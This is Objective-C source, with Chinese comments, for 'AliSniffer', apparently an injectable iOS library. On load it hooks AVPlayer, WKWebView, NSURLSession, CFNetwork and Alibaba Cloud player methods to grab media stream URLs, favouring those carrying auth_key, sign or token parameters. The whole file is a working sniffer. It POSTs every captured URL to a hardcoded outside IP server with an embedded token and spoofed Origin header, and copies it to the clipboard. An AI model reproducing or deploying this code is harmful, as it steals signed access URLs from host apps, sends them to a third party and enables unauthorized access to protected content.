// AliSniffer.m — 直接生效版（无隐身/无手势）
// 注入即弹“已加载”，所有钩子立即安装；命中即上报+弹窗+复制；优先 auth_key；60s 去重。
// 覆盖链路：AVPlayer 入点、AVAssetResourceLoader 代理包裹、WKWebView 导航、CFNetwork(CFReadStream) 兜底、阿里云 AVPUrlSource/AliPlayer。
// 需要与工程内 fishhook.c/h 一起编译。
// 链接：UIKit / Foundation / AVFoundation / WebKit / CoreMedia / CFNetwork

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import "fishhook.h"

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0;
static const BOOL kPopupOnAuth  = YES;   // 命中含 auth/sign/token 的 URL 弹窗 + 复制
static const BOOL kPopupOnPlain = YES;   // 其他 URL 也弹窗（如需静默改为 NO）

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

#pragma mark - 公共工具

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *win = nil;
            if (@available(iOS 13.0,*)) {
                for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
                    if (sc.activationState==UISceneActivationStateForegroundActive){
                        for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win = w; break; }
                        if (win) break;
                    }
                }
            }
            if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
            UIViewController *vc = win.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}
static BOOL hasAuthLike(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] ||
           [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    ||
           [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] ||
        [s containsString:@".ts"]   || [s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"] || [s containsString:@"phonelive"] ||
        [s containsString:@"replay"] || [s containsString:@"pull."] ||
        [s containsString:@"live"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u];
        NSDate *now  = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}
static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}
static void handleURL(NSString *u, NSString *from){
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;
    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
    postText(u);
    if (auth){ if (kPopupOnAuth)  { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
    else     { if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
}

#pragma mark - A) AV 播放链路（AVPlayer + ResourceLoader）

// 1) AVPlayer 入点：replaceCurrentItem / setCurrentItem
static IMP orig_replaceItem = NULL, orig_setItem = NULL;
static void sniff_item(AVPlayerItem *item, NSString *from){
    @try{
        AVURLAsset *asset = (AVURLAsset *)item.asset;
        if ([asset isKindOfClass:AVURLAsset.class]) {
            NSString *u = asset.URL.absoluteString;
            if (u.length) dispatch_async(gq, ^{ handleURL(u, from); });
        }
    }@catch(__unused NSException *e){}
}
static void sn_replaceItem(id self, SEL _cmd, AVPlayerItem *item){
    sniff_item(item, @"AVPlayer.replaceItem");
    ((void(*)(id,SEL,id))orig_replaceItem)(self,_cmd,item);
}
static void sn_setItem(id self, SEL _cmd, AVPlayerItem *item){
    sniff_item(item, @"AVPlayer.setCurrentItem");
    ((void(*)(id,SEL,id))orig_setItem)(self,_cmd,item);
}
static void install_avplayer(void){
    Class P = objc_getClass("AVPlayer");
    if (!P) return;
    Method m1 = class_getInstanceMethod(P, sel_getUid("replaceCurrentItemWithPlayerItem:"));
    if (m1){ orig_replaceItem = method_getImplementation(m1); method_setImplementation(m1,(IMP)sn_replaceItem); }
    Method m2 = class_getInstanceMethod(P, sel_getUid("setCurrentItem:"));
    if (m2){ orig_setItem = method_getImplementation(m2); method_setImplementation(m2,(IMP)sn_setItem); }
    LOG("AVPlayer hooks installed");
}

// 2) ResourceLoader 代理包裹：仅透传不改业务
@interface RLProxy : NSObject<AVAssetResourceLoaderDelegate>
@property (nonatomic, weak) id<AVAssetResourceLoaderDelegate> real;
@end
@implementation RLProxy
- (BOOL)resourceLoader:(AVAssetResourceLoader *)loader shouldWaitForLoadingOfRequestedResource:(AVAssetResourceLoadingRequest *)req {
    @try{
        NSURL *u = req.request ? req.request.URL : nil;
        if (!u) u = [req valueForKeyPath:@"request.URL"];
        if (u.absoluteString.length) dispatch_async(gq, ^{ handleURL(u.absoluteString, @"ResourceLoader"); });
    }@catch(__unused NSException *e){}
    if ([self.real respondsToSelector:_cmd])
        return ((BOOL(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, req);
    return NO;
}
- (void)resourceLoader:(AVAssetResourceLoader *)loader didCancelLoadingRequest:(AVAssetResourceLoadingRequest *)req {
    if ([self.real respondsToSelector:_cmd])
        ((void(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, req);
}
@end

static IMP  orig_rl_setDelegate = NULL;
static void sn_rl_setDelegate(id self, SEL _cmd, id delegate, id queue){
    id wrap = delegate;
    @try{
        if (delegate && ![delegate isKindOfClass:RLProxy.class]){
            RLProxy *p = [RLProxy new]; p.real = delegate; wrap = p;
        }
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL,id,id))orig_rl_setDelegate)(self,_cmd,wrap,queue);
}
static void install_resource_loader_wrap(void){
    Class RL = objc_getClass("AVAssetResourceLoader");
    if (!RL) return;
    Method m = class_getInstanceMethod(RL, sel_getUid("setDelegate:queue:"));
    if (!m) return;
    const char *enc = method_getTypeEncoding(m);
    if (!enc || enc[0] != 'v') return;   // 简单签名校验
    orig_rl_setDelegate = method_getImplementation(m);
    method_setImplementation(m, (IMP)sn_rl_setDelegate);
    LOG("RL proxy installed");
}

#pragma mark - B) 阿里云链路（命中你的另一个 App 同款）

static void hook_AVPUrlSource(void){
    Class c = objc_getClass("AVPUrlSource"); if (!c) return;
    SEL cs = sel_getUid("urlWithString:");
    Method mcls = class_getClassMethod(c, cs);
    if (mcls) {
        IMP orig = method_getImplementation(mcls);
        IMP now  = imp_implementationWithBlock(^id(id _self, NSString *s){
            @try{ if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.urlWithString"); }); }@catch(...) {}
            if (orig){ id(*fn)(id,SEL,NSString*)=(id(*)(id,SEL,NSString*))orig; return fn(_self,cs,s); }
            return (id)nil;
        });
        method_setImplementation(mcls, now);
    }
    SEL is = sel_getUid("setUrl:");
    Method minst = class_getInstanceMethod(c, is);
    if (minst) {
        IMP orig = method_getImplementation(minst);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try{ if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.setUrl"); }); }@catch(...) {}
            if (orig){ void(*fn)(id,SEL,NSString*)=(void(*)(id,SEL,NSString*))orig; fn(_self,is,s); }
        });
        method_setImplementation(minst, now);
    }
}
static void hook_AliPlayer(void){
    Class c = objc_getClass("AliPlayer"); if (!c) return;
    SEL su = sel_getUid("setUrl:");
    Method mu = class_getInstanceMethod(c, su);
    if (mu) {
        IMP orig = method_getImplementation(mu);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try{ if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AliPlayer.setUrl"); }); }@catch(...) {}
            if (orig){ void(*fn)(id,SEL,NSString*)=(void(*)(id,SEL,NSString*))orig; fn(_self,su,s); }
        });
        method_setImplementation(mu, now);
    }
    NSArray<NSString*> *sels = @[@"setStsSource:", @"setAuthSource:", @"setMpsSource:"];
    for (NSString *name in sels){
        SEL s = sel_getUid(name.UTF8String);
        Method m = class_getInstanceMethod(c, s);
        if (!m) continue;
        IMP orig = method_getImplementation(m);
        IMP now  = imp_implementationWithBlock(^(id _self, id src){
            @try{
                NSString *u = nil;
                if ([src respondsToSelector:@selector(valueForKey:)]){
                    @try{ u=[src valueForKey:@"url"]; }@catch(...) {}
                    if (!u){ @try{ u=[src valueForKey:@"playUrl"]; }@catch(...) {} }
                }
                if (u.length) dispatch_async(gq, ^{ handleURL(u, [@"AliPlayer." stringByAppendingString:name]); });
            }@catch(...) {}
            if (orig){ void(*fn)(id,SEL,id)=(void(*)(id,SEL,id))orig; fn(_self,s,src); }
        });
        method_setImplementation(m, now);
    }
}

#pragma mark - C) WKWebView 导航（H5 播放页）

@interface WKNavProxy : NSObject<WKNavigationDelegate>
@property (nonatomic, weak) id<WKNavigationDelegate> real;
@end
@implementation WKNavProxy
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)na decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    @try{
        NSString *u = na.request.URL.absoluteString;
        if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WKNavigation"); });
    }@catch(__unused NSException *e){}
    if ([self.real respondsToSelector:_cmd])
        ((void(*)(id,SEL,id,id,id))objc_msgSend)(self.real,_cmd,webView,na,decisionHandler);
    else decisionHandler(WKNavigationActionPolicyAllow);
}
@end

static IMP orig_wk_setNav = NULL;
static void sn_wk_setNav(id self, SEL _cmd, id delegate){
    id wrap = delegate;
    @try{
        if (delegate && ![delegate isKindOfClass:WKNavProxy.class]){
            WKNavProxy *p = [WKNavProxy new]; p.real = delegate; wrap = p;
        }
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL,id))orig_wk_setNav)(self,_cmd,wrap);
}
static void install_wk(void){
    Class WK = objc_getClass("WKWebView");
    if (!WK) return;
    Method m = class_getInstanceMethod(WK, sel_getUid("setNavigationDelegate:"));
    if (!m) return;
    orig_wk_setNav = method_getImplementation(m);
    method_setImplementation(m, (IMP)sn_wk_setNav);
    LOG("WK wrap installed");
}

#pragma mark - D) CFNetwork 兜底（fishhook：CFReadStream）

static CFReadStreamRef (*orig_CFReadStreamCreateForHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef);
static CFReadStreamRef (*orig_CFReadStreamCreateForStreamedHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef, CFReadStreamRef);

static NSString* urlFromMsg(CFHTTPMessageRef msg){
    if (!msg) return nil;
    CFURLRef url = CFHTTPMessageCopyRequestURL(msg);
    if (!url) return nil;
    NSString *s = ((__bridge_transfer NSURL*)url).absoluteString;
    return s;
}
static CFReadStreamRef sn_CFReadStreamCreateForHTTPRequest(CFAllocatorRef a, CFHTTPMessageRef m){
    @try{ NSString *u = urlFromMsg(m); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream"); }); }@catch(__unused NSException *e){}
    return orig_CFReadStreamCreateForHTTPRequest ? orig_CFReadStreamCreateForHTTPRequest(a,m) : NULL;
}
static CFReadStreamRef sn_CFReadStreamCreateForStreamedHTTPRequest(CFAllocatorRef a, CFHTTPMessageRef m, CFReadStreamRef b){
    @try{ NSString *u = urlFromMsg(m); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream(streamed)"); }); }@catch(__unused NSException *e){}
    return orig_CFReadStreamCreateForStreamedHTTPRequest ? orig_CFReadStreamCreateForStreamedHTTPRequest(a,m,b) : NULL;
}
static void install_cf(void){
    struct rebinding rebs[] = {
        {"CFReadStreamCreateForHTTPRequest",         (void*)sn_CFReadStreamCreateForHTTPRequest,         (void**)&orig_CFReadStreamCreateForHTTPRequest},
        {"CFReadStreamCreateForStreamedHTTPRequest", (void*)sn_CFReadStreamCreateForStreamedHTTPRequest, (void**)&orig_CFReadStreamCreateForStreamedHTTPRequest},
    };
    rebind_symbols(rebs, (sizeof rebs/sizeof rebs[0]));
    LOG("CF hooks installed");
}

#pragma mark - E) 系统网络兜底（NSURLSessionTask）

static IMP g_orig_resume = NULL;
static void sn_task_resume(id self, SEL _cmd){
    @try{
        NSURLRequest *req = nil;
        if ([self respondsToSelector:@selector(currentRequest)])
            req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("currentRequest"));
        if (!req && [self respondsToSelector:@selector(originalRequest)])
            req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("originalRequest"));
        NSString *s = req.URL.absoluteString;
        if (s.length) dispatch_async(gq, ^{ handleURL(s, @"NSURLSessionTask"); });
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL))g_orig_resume)(self,_cmd);
}
static void install_nsurlsession(void){
    Class c = objc_getClass("NSURLSessionTask");
    if (!c) return;
    Method m = class_getInstanceMethod(c, sel_getUid("resume"));
    if (!m) return;
    g_orig_resume = method_getImplementation(m);
    method_setImplementation(m, (IMP)sn_task_resume);
    LOG("NSURLSession resume hooked");
}

#pragma mark - F) 阿里云/系统媒体创建兜底（AVPlayerItem/AVURLAsset）
static IMP g_AVPI_urlIMP    = NULL; // +[AVPlayerItem playerItemWithURL:]
static IMP g_AVUA_urloptIMP = NULL; // +[AVURLAsset URLAssetWithURL:options:]

static id sn_AVPI_url(id self, SEL _cmd, NSURL *URL) {
    @try{
        if (URL.absoluteString.length) {
            dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVPlayerItem"); });
        }
    } @catch (__unused NSException *e) {}
    // 强转成正确签名再调用原实现
    if (g_AVPI_urlIMP) {
        typedef id (*Fn)(id, SEL, NSURL *);
        return ((Fn)g_AVPI_urlIMP)(self, _cmd, URL);
    }
    return nil;
}

static id sn_AVUA_urlopt(id self, SEL _cmd, NSURL *URL, id opt) {
    @try{
        if (URL.absoluteString.length) {
            dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVURLAsset"); });
        }
    } @catch (__unused NSException *e) {}
    if (g_AVUA_urloptIMP) {
        typedef id (*Fn)(id, SEL, NSURL *, id);
        return ((Fn)g_AVUA_urloptIMP)(self, _cmd, URL, opt);
    }
    return nil;
}

static void install_av_foundation_creators(void){
    // +[AVPlayerItem playerItemWithURL:]
    Class avpi = objc_getClass("AVPlayerItem");
    if (avpi) {
        Method m = class_getClassMethod(avpi, sel_getUid("playerItemWithURL:"));
        if (m) {
            g_AVPI_urlIMP = method_getImplementation(m);
            method_setImplementation(m, (IMP)sn_AVPI_url);
        }
    }

    // +[AVURLAsset URLAssetWithURL:options:]
    Class avua = objc_getClass("AVURLAsset");
    if (avua) {
        Method m = class_getClassMethod(avua, sel_getUid("URLAssetWithURL:options:"));
        if (m) {
            g_AVUA_urloptIMP = method_getImplementation(m);
            method_setImplementation(m, (IMP)sn_AVUA_urlopt);
        }
    }
}

#pragma mark - 入口：注入即启用 + 弹窗

__attribute__((constructor))
static void AliSnifferInit(void){
    @try{
        if (!gq)    gq    = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];

        // 安装所有链路（直接生效）
        install_avplayer();                 // AVPlayer 入点
        install_resource_loader_wrap();     // ResourceLoader 代理包裹
        install_wk();                       // WK 导航
        install_cf();                       // CFNetwork 兜底
        install_nsurlsession();             // NSURLSession 兜底
        install_av_foundation_creators();   // AV 创建兜底
        hook_AVPUrlSource();                // 阿里云
        hook_AliPlayer();                   // 阿里云

        // 注入成功提示（立即）
        popup(@"AliSniffer 已加载", @"直接生效版：AV+RL+WK+CF 全部启用；auth_key 优先；命中即上报+复制。", nil);
    }@catch(__unused NSException *e){}
}
